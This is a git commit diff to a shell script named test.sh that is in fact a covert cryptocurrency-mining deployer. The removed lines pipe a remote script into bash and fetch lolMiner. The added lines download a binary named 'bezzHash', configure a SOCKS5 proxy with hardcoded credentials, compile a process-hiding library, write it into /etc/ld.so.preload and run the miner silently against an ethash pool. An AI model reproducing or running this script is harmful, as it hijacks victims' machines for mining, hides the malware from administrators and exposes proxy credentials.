1f06880bdae52a6b1d4a3cc3e12a74a5c5c6b9eb
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 06:25:16 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,15 +1,44 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/17mei2022/No_lol/main/px_1.sh | bash
-wget https://github.com/17mei2022/No_lol/raw/main/magicLol.zip
-unzip magicLol.zip
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
-tar -xvzf lolMiner_v1.51_Lin64.tar.gz
-rm .gitignore
-cd 1.51
-wget https://raw.githubusercontent.com/17mei2022/No_lol/main/set_lol.sh
-chmod +x *.sh
-graftcp ./set_lol.sh
+
+./graftcp/graftcp nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T60)@ethash.kupool.com:443 > nohup.out >/dev/null 2>&1 >/dev/null 2>&1 >/dev/null 2>&1
